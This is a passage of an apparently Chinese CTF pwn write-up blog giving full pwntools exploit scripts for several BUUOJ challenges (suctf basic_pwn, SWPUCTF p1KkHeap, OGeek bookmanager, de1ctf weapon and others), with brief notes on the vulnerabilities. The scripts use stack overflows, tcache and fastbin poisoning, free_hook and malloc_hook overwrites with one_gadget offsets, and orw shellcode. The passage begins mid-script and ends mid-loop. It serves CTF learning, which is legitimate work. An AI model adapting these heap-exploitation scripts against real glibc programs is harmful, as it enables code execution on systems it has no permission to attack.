s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()


data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])
sla(<span class="hljs-string">'flag'</span>,data)
ru(<span class="hljs-string">'hing detected ***: '</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)

data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(libc.sym[<span class="hljs-string">'_environ'</span>] + libc_base)
sla(<span class="hljs-string">'flag'</span>,data)
ru(<span class="hljs-string">'hing detected ***: '</span>)

stack_flag = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x168</span>
info_addr(<span class="hljs-string">'stack_base'</span>,stack_flag)
data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(stack_flag)
sla(<span class="hljs-string">'flag'</span>,data)
itr()</code></pre></div>

<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>无脑栈溢出</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./SUCTF_2018_basic_pwn'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25741</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x118</span> + p64(<span class="hljs-number">0x000000401157</span>)
sl(data)
itr()</code></pre></div>

<h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开了沙箱，可以orw拿到flag</li>
<li>功能只能调用18次，free只能3次</li>
<li>free中存在uaf</li>
<li>mmap了一块 rwx的内存在 <code>0x66660000</code></li>
</ul>
<h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>泄漏heap base，准备攻击tcache bin的表头</li>
<li>覆盖bin counts为7，伪造满bin，free chunk，泄漏libc</li>
<li>攻击tcache bin的表头中bin chunk header 的部分，放下<code>0x66660000</code> 和<code>malloc_hook</code>，准备修改这两个部分。</li>
<li>在<code>0x66660000</code>的内存上写下orw的shellcode</li>
<li>攻击<code>malloc_hook</code>为<code>0x66660000</code> 取得flag</li>
</ul>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./SWPUCTF_2019_p1KkHeap'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29911</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-string">'''
================================================================================
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
'''</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'id'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'id'</span>,str(idx))
    sa(<span class="hljs-string">'tent'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'id'</span>,str(idx))



add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>
free(<span class="hljs-number">0</span>)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
ru(<span class="hljs-string">'content: '</span>)
heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>
info_addr(<span class="hljs-string">'heap_base'</span>,heap_base)
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>
edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x10</span>))
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>
debug()
data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span>
edit(<span class="hljs-number">3</span>,data)
add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span>
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
ru(<span class="hljs-string">'content: '</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0xc0</span> - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x3ebc30</span> + libc_base) +p64(<span class="hljs-number">0x66660000</span>) 
edit(<span class="hljs-number">3</span>,data)
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>
orw = shellcraft.open(<span class="hljs-string">'flag'</span>)
orw += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)
orw +=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)
edit(<span class="hljs-number">5</span>,asm(orw))
add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#6</span>
edit(<span class="hljs-number">6</span>,p64(<span class="hljs-number">0x66660000</span>))
add(<span class="hljs-number">1</span>)
itr()</code></pre></div>

<h3 id="题记-1"><a href="#题记-1" class="headerlink" title="题记"></a>题记</h3><p>在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。</p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>在tcache bin的表头中，其每个大小tcache bin的count(0-7) 是一个无符号类型的数据。</strong></p>
<p>当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。</p>
<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
<span class="hljs-number">0x55daa2e85000</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x250</span>                Used                None              None
<span class="hljs-number">0x55daa2e85250</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x7fb70dbbaca0</span>    <span class="hljs-number">0x7fb70dbbaca0</span>
<span class="hljs-number">0x55daa2e85360</span>      <span class="hljs-number">0x110</span>               <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x55daa2e85370</span>              None
pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x55daa2e85000</span>
<span class="hljs-number">0x55daa2e85000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000251</span>
<span class="hljs-number">0x55daa2e85010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0xff00000000000000</span>
<span class="hljs-number">0x55daa2e85020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div>

<p>剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p>
<h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><code>护网杯_2018_gettingstart</code></h2><p>白给题。考浮点数在内存中是怎么存的。</p>
<div class="hljs"><pre><code class="hljs python">data = <span class="hljs-string">'1'</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0x7fffffffffffffff</span>) + p64(<span class="hljs-number">0x3FB999999999999A</span>)
s(data)
itr()</code></pre></div>

<h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul>
<li>存在heap overflow</li>
<li>uaf</li>
<li>off by one</li>
</ul>
<p>一堆洞，伪代码看起来很复杂，但是利用起来较为简单。</p>
<p>重点漏洞函数在 updata上。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./pwn-2'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29005</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_chapter</span><span class="hljs-params">(name)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)
    sa(<span class="hljs-string">'name'</span>,str(name))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_section</span><span class="hljs-params">(chapter,name)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)
    sa(<span class="hljs-string">'into'</span>,str(chapter))
    sa(<span class="hljs-string">'name'</span>,str(name))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_text</span><span class="hljs-params">(section,size,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
    sa(<span class="hljs-string">'into'</span>,str(section))
    sla(<span class="hljs-string">'write'</span>,str(size))
    sa(<span class="hljs-string">'Text'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_chapter</span><span class="hljs-params">(name)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'name'</span>,str(name))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_section</span><span class="hljs-params">(name)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'5'</span>)
    sla(<span class="hljs-string">'name'</span>,str(name))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_text</span><span class="hljs-params">(name)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'6'</span>)
    sla(<span class="hljs-string">'name'</span>,str(name))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'7'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(type,name,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'8'</span>)
    sla(<span class="hljs-string">'update'</span>,str(type))
    sa(<span class="hljs-string">'name'</span>,str(name))
    sa(<span class="hljs-string">'New'</span>,str(data))
sla(<span class="hljs-string">'Name'</span>,<span class="hljs-string">'chumen77'</span> * <span class="hljs-number">4</span>)
add_chapter(<span class="hljs-string">'chumen77'</span>)
add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)
add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'2'</span>)
add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'3'</span>)
add_text(<span class="hljs-string">'1'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)
<span class="hljs-comment"># show()</span>
add_text(<span class="hljs-string">'2'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x100</span>)
del_section(<span class="hljs-string">'1'</span>)
del_section(<span class="hljs-string">'2'</span>)
show()
ru(<span class="hljs-string">'Section:'</span>)
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
free_hook = <span class="hljs-number">0x3c67a8</span> + libc_base
add_text(<span class="hljs-string">'3'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)

edit(<span class="hljs-string">'Section'</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'3'</span> + <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'1'</span>*(<span class="hljs-number">0x20</span><span class="hljs-number">-2</span>) + <span class="hljs-string">'\xd0'</span>)
data = p64(free_hook) + p64(<span class="hljs-number">0x20</span>)
edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,data)
one = libc_base + rce16[<span class="hljs-number">2</span>]
edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,p64(one))
del_chapter(<span class="hljs-string">'chumen77'</span>)
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h3 id="题记-2"><a href="#题记-2" class="headerlink" title="题记"></a>题记</h3><ul>
<li><p>题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4></li>
<li><p>对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。</p>
</li>
</ul>
<h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><ul>
<li>uaf</li>
<li>最大只能申请0x60的chunk</li>
<li>没有show函数</li>
<li>部分input利用scanf来获取读入</li>
</ul>
<h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin</li>
<li>利用残留的libc地址，fastbin attck <code>IO_stdout</code>来泄漏libc</li>
<li>fastbin attck <code>malloc_hook</code></li>
</ul>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./de1ctf_2019_weapon'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size of weapon:'</span>,str(size))
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sa(<span class="hljs-string">'name'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))
    sa(<span class="hljs-string">'new'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>
    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    free(<span class="hljs-number">0</span>)
    free(<span class="hljs-number">1</span>)
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x1000</span>)
    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p16(<span class="hljs-number">0xa5dd</span>))
    free(<span class="hljs-number">3</span>)
    free(<span class="hljs-number">2</span>)
    free(<span class="hljs-number">3</span>)
    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>)
    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)
    <span class="hljs-comment"># debug()</span>
    data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)
    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,data)
leak = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-keyword">try</span>:
        leak_addr()
        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)
        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        io.recv(<span class="hljs-number">10</span>)
        leak = uu64(r(<span class="hljs-number">6</span>))
        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> Exception:
        io.close()
        <span class="hljs-comment"># io = process('./de1ctf_2019_weapon')</span>
